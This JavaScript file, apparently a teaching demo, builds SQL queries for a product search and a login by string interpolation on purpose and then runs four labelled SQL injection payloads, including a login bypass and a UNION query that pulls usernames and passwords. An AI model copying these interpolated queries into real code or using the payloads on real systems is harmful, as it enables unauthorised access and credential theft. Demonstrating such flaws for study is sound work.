// vulnerable.js
const Database = require('better-sqlite3');
const db = new Database('nyondo_hardware.db');

function searchProduct(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log('\n[QUERY]:', query);
    const rows = db.prepare(query).all();
    console.log('[RESULT]:', rows);
    return rows;
}

function login(username, password) {
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('\n[QUERY]:', query);
    const row = db.prepare(query).get();
    console.log('[RESULT]:', row);
    return row;
}

console.log('\n========== ATTACK 1: Dump all products ==========');
searchProduct("' OR 1=1--");

console.log('\n========== ATTACK 2: Login bypass (no password) ==========');
login("admin'--", "anything");

console.log('\n========== ATTACK 3: Always true login ==========');
login("' OR '1'='1", "' OR '1'='1");

console.log('\n========== ATTACK 4: UNION attack - steal users ==========');
searchProduct("' UNION SELECT id, username, password, role FROM users--");

db.close();